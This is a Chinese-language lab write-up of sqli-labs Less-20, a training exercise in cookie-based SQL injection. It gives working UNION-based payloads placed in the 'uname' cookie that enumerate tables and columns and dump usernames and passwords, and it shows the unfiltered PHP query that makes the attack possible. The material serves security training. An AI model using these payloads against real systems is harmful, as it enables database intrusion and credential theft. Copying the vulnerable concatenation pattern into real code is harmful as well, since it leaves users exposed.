# sqli-labs Less-20 复现

Less-20 是基于 **Cookie 字段的 SQL 注入**，核心原理是后端从 Cookie 中读取用户名并直接拼接进 SQL 查询，未做过滤，导致注入漏洞。

---

#### 🔍 前置准备

1. 部署好 sqli-labs 环境（本地或虚拟机均可）。

2. 准备抓包工具：Burp Suite 或浏览器开发者工具（F12）。

3. 访问 Less-20 页面：`http://<你的sqli-labs地址>/sqli-labs/Less-20/`。

---

#### 📝 复现步骤

##### 1. 触发登录，获取初始 Cookie

- 在登录页输入任意账号密码（如 `admin` / `123456`），点击登录。

- 登录成功后，页面会显示 Cookie 信息：`YOUR COOKIE : uname = admin`，说明后端从 Cookie 中读取 `uname` 字段。

##### 2. 抓包并测试注入点

- 用 Burp Suite 抓包，或在浏览器开发者工具（F12 → Application → Cookies）中找到 `uname` 字段。

- 修改 Cookie 为：`uname=admin'`，刷新页面。

- 观察报错信息：

    ```Plain Text
    
    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'admin'' LIMIT 0,1' at line 1
    ```

    说明：

    - 闭合方式为 **单引号 ** **`'`**。

    - SQL 语句后带有 `LIMIT 0,1`，注入时需用 `#` 注释掉后续内容。

##### 3. 判断列数

- 修改 Cookie 为：`uname=admin' order by 3#`，刷新页面，若正常显示，说明列数 ≥ 3。

- 再修改为：`uname=admin' order by 4#`，若页面报错，说明列数为 **3**。

##### 4. 联合查询注入

- 修改 Cookie 为：`uname=' union select 1,2,3#`，刷新页面，找到回显字段（页面中会显示 `2` 和 `3`，说明这两个位置可回显数据）。

- 替换为查询数据库信息：

    ```Plain Text
    
    uname=' union select 1,version(),database()#
    ```

    刷新后可获取：

    - 数据库版本：如 `5.7.36`

    - 当前数据库名：如 `security`

##### 5. 获取表名

- 修改 Cookie 为：

    ```Plain Text
    
    uname=' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#
    ```

    刷新后可获取当前数据库的表名：`emails,referers,uagents,users`。

##### 6. 获取列名（以 `users` 表为例）

- 修改 Cookie 为：

    ```Plain Text
    
    uname=' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'#
    ```

    刷新后可获取 `users` 表的列名：`id,username,password`。

##### 7. 获取用户数据

- 修改 Cookie 为：

    ```Plain Text
    
    uname=' union select 1,group_concat(username,0x3a,password),3 from users#
    ```

    刷新后可获取所有用户名和密码，如：

    ```Plain Text
    
    admin:admin, Dumb:Dumb, Angelina:I-kill-you, ...
    ```

---

#### 💡 关键原理

Less-20 的后端代码逻辑如下（简化版）：

```PHP

$uname = $_COOKIE['uname'];
$sql = "SELECT * FROM users WHERE username='$uname' LIMIT 0,1";
```

由于直接从 Cookie 读取 `uname` 并拼接进 SQL，未做任何过滤，导致攻击者可通过修改 Cookie 构造恶意 SQL 语句，实现注入。

---

#### ✅ 总结

Less-20 是典型的 **Cookie 注入**，核心是利用未过滤的 Cookie 字段构造注入语句。复现的关键在于：

1. 识别注入点在 Cookie 的 `uname` 字段。

2. 用单引号闭合 SQL 语句，并用 `#` 注释掉后续内容。

3. 通过联合查询逐步获取数据库信息、表名、列名和数据。
> （注：文档部分内容可能由 AI 生成）